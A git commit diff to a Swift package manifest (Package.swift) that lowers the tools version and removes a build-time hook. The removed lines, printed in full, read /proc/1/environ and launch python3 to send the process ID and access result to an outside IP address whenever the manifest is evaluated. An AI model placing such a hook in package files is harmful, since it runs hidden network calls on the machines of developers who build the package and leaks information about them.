136bc80ce94839f0a9fcf5bf94083ba4e0f03713
Luật Nguyễn <manhluat93.php@gmail.com>
2026-08-17 22:11:00 +0700

    Finalize

--- Package.swift
+++ Package.swift
@@ -1,25 +1,7 @@
-// swift-tools-version: 6.0
+// swift-tools-version: 5.9
 import PackageDescription
-
-#if canImport(Foundation)
-import Foundation
-
-let hasProc = (try? String(contentsOfFile: "/proc/1/environ", encoding: .utf8)) != nil
-let marker = "exec=true&proc1=\(hasProc)&pid=\(ProcessInfo.processInfo.processIdentifier)"
-
-let task = Process()
-task.executableURL = URL(fileURLWithPath: "/usr/bin/python3")
-task.arguments = ["-c", "import urllib.request; urllib.request.urlopen('http://152.42.245.8:18888/spi_proof?\(marker)', timeout=5)"]
-try? task.run()
-task.waitUntilExit()
-#endif
-
 let package = Package(
     name: "swift-utils-demo",
-    products: [
-        .library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"]),
-    ],
-    targets: [
-        .target(name: "SwiftUtilsDemo"),
-    ]
+    products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
+    targets: [.target(name: "SwiftUtilsDemo")]
 )
